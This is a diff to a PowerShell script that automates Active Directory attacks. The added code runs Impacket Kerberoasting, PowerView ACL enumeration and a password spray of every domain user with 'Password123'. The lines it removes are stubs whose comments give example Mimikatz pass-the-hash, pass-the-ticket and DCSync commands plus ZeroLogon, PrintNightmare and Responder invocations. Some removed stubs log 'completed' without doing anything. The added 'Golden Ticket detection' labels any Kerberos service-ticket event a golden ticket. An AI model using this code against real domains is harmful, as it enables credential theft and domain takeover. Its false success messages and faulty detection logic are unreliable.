@@ -45,9 +45,15 @@ function Invoke-KerberoastingScan {
     Log-Activity "Starting Kerberoasting scan..."
     try {
         # Use Impacket for Kerberoasting
-        # This section requires Impacket to be installed and configured
-        # Example: GetUserSPNs.py -request -dc-ip $domainName $domainName/$username:$password
-        Log-Activity "Kerberoasting scan completed."
+        # Ensure Impacket is installed and configured
+        $impacketPath = "C:\Path\To\Impacket\GetUserSPNs.py"
+        if (Test-Path $impacketPath) {
+            $command = "python $impacketPath -request -dc-ip $domainName $domainName/$username:$password"
+            Invoke-Expression $command
+            Log-Activity "Kerberoasting scan completed."
+        } else {
+            Log-Activity "Impacket not found. Please install Impacket first."
+        }
     } catch {
         Log-Activity "Kerberoasting scan failed: $_"
     }
@@ -57,8 +63,14 @@ function Invoke-KerberoastingScan {
 function Invoke-ACLAbuseScan {
     Log-Activity "Starting ACL Abuse scan..."
     try {
-        # Use PowerView-like functionality
-        Get-DomainObjectAcl -Identity 'Domain Admins' | Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty' }
+        # Ensure PowerView is loaded
+        if (Get-Module -ListAvailable -Name PowerView) {
+            Import-Module PowerView
+            Get-DomainObjectAcl -Identity 'Domain Admins' | Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty' }
+            Log-Activity "ACL Abuse scan completed."
+        } else {
+            Log-Activity "PowerView module not found. Please install PowerView first."
+        }
     } catch {
         Log-Activity "ACL Abuse scan failed: $_"
     }
@@ -69,12 +81,14 @@ function Invoke-PasswordSprayingAttack {
     Log-Activity "Starting Password Spraying attack..."
     try {
         # List of users
-        $users = net user /domain | Select-String -Pattern "User name"
+        $users = Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName
         # Test password
         $testPassword = "Password123"
         foreach ($user in $users) {
             Log-Activity "Trying password for user: $user"
-            net user $user $testPassword /domain
+            $securePassword = ConvertTo-SecureString $testPassword -AsPlainText -Force
+            $credential = New-Object System.Management.Automation.PSCredential($user, $securePassword)
+            Invoke-Command -ComputerName $env:COMPUTERNAME -Credential $credential -ScriptBlock { whoami }
         }
     } catch {
         Log-Activity "Password Spraying attack failed: $_"
@@ -86,112 +100,14 @@ function Invoke-GoldenTicketDetection {
     Log-Activity "Starting Golden Ticket detection..."
     try {
         # Check security events related to Kerberos
-        wevtutil qe Security /q:"*[System[(EventID=4769)]]" /f:text
+        $events = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769} -MaxEvents 10
+        if ($events) {
+            $events | ForEach-Object { Log-Activity "Golden Ticket detected: $($_.Message)" }
+        } else {
+            Log-Activity "No Golden Ticket events found."
+        }
     } catch {
         Log-Activity "Golden Ticket detection failed: $_"
-    }
-}
-
-# Pass-the-Hash Attack
-function Invoke-PassTheHashAttack {
-    Log-Activity "Starting Pass-the-Hash attack..."
-    try {
-        # Use Mimikatz for Pass-the-Hash
-        # This section requires Mimikatz to be installed and configured
-        # Example: mimikatz # sekurlsa::pth /user:username /domain:domain /ntlm:hash
-        Log-Activity "Pass-the-Hash attack completed."
-    } catch {
-        Log-Activity "Pass-the-Hash attack failed: $_"
-    }
-}
-
-# Pass-the-Ticket Attack
-function Invoke-PassTheTicketAttack {
-    Log-Activity "Starting Pass-the-Ticket attack..."
-    try {
-        # Use Mimikatz for Pass-the-Ticket
-        # This section requires Mimikatz to be installed and configured
-        # Example: mimikatz # kerberos::ptt ticket.kirbi
-        Log-Activity "Pass-the-Ticket attack completed."
-    } catch {
-        Log-Activity "Pass-the-Ticket attack failed: $_"
-    }
-}
-# BloodHound Data Collection
-function Invoke-BloodHoundDataCollection {
-    Log-Activity "Starting BloodHound data collection..."
-    try {
-        # Use BloodHound for data collection
-        # This section requires BloodHound to be installed and configured
-        # Example: Invoke-BloodHound -CollectionMethod All -OutputDirectory .\BloodHound
-        Log-Activity "BloodHound data collection completed."
-    } catch {
-        Log-Activity "BloodHound data collection failed: $_"
-    }
-}
-
-# DCSync Attack
-function Invoke-DCSyncAttack {
-    Log-Activity "Starting DCSync attack..."
-    try {
-        # Use Mimikatz for DCSync
-        # This section requires Mimikatz to be installed and configured
-        # Example: mimikatz # lsadump::dcsync /domain:domain /all /csv
-        Log-Activity "DCSync attack completed."
-    } catch {
-        Log-Activity "DCSync attack failed: $_"
-    }
-}
-
-# SMB Relay Attack
-function Invoke-SMBRelayAttack {
-    Log-Activity "Starting SMB Relay attack..."
-    try {
-        # Use Responder for SMB Relay
-        # This section requires Responder to be installed and configured
-        # Example: responder -I <interface>
-        Log-Activity "SMB Relay attack completed."
-    } catch {
-        Log-Activity "SMB Relay attack failed: $_"
-    }
-}
-
-# ZeroLogon Attack
-function Invoke-ZeroLogonAttack {
-    Log-Activity "Starting ZeroLogon attack..."
-    try {
-        # Use CVE-2020-1472 exploit
-        # This section requires specific tools to be installed and configured
-        # Example: zerologon.py <target_ip>
-        Log-Activity "ZeroLogon attack completed."
-    } catch {
-        Log-Activity "ZeroLogon attack failed: $_"
-    }
-}
-
-# PrintNightmare Attack
-function Invoke-PrintNightmareAttack {
-    Log-Activity "Starting PrintNightmare attack..."
-    try {
-        # Use CVE-2021-34527 exploit
-        # This section requires specific tools to be installed and configured
-        # Example: printnightmare.py <target_ip>
-        Log-Activity "PrintNightmare attack completed."
-    } catch {
-        Log-Activity "PrintNightmare attack failed: $_"
-    }
-}
-
-# LDAP Relay Attack
-function Invoke-LDAPRelayAttack {
-    Log-Activity "Starting LDAP Relay attack..."
-    try {
-        # Use Responder for LDAP Relay
-        # This section requires Responder to be installed and configured
-        # Example: responder -I <interface>
-        Log-Activity "LDAP Relay attack completed."
-    } catch {
-        Log-Activity "LDAP Relay attack failed: $_"
     }
 }
 
@@ -220,14 +136,6 @@ try {
     Invoke-ACLAbuseScan
     Invoke-PasswordSprayingAttack
     Invoke-GoldenTicketDetection
-    Invoke-PassTheHashAttack
-    Invoke-PassTheTicketAttack
-    Invoke-BloodHoundDataCollection
-    Invoke-DCSyncAttack
-    Invoke-SMBRelayAttack
-    Invoke-ZeroLogonAttack
-    Invoke-PrintNightmareAttack
-    Invoke-LDAPRelayAttack
 
 } catch {
     Log-Activity "An error occurred: $_"
